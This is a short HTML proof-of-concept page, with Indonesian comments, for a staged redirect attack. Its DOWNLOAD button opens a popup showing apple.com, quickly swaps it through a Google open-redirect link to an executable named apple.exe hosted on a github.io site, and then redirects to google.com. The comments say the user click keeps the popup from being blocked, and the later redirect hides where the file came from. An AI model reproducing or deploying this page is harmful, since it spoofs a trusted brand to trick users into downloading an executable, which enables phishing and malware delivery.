<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Redirect Bertahap PoC</title>
    <style>
        .button {
            border: none;
            color: white;
            padding: 15px 32px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
        }
    </style>
</head>
<body>

<script>
function a() {
    const start = Date.now();
    console.log("Window opened at", start);

    // STEP 1: buka window (user gesture → tidak diblokir)
    const win = window.open('https://apple.com', '_blank');

    if (!win) {
        alert("Popup diblokir browser");
        return;
    }

    // STEP 2: redirect cepat ke URL target
    setTimeout(() => {
        console.log("Redirect 1 after", Date.now() - start, "ms");
        win.location.replace(
            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe'
        );
    }, 100);

    // STEP 3: redirect lanjutan (opsional)
    setTimeout(() => {
        console.log("Redirect 2 after", Date.now() - start, "ms");
        win.location.replace('https://google.com');
    }, 3000);
}
</script>

<center>
    <input type="button" class="button" value="DOWNLOAD" onclick="a()">
</center>

</body>
</html>
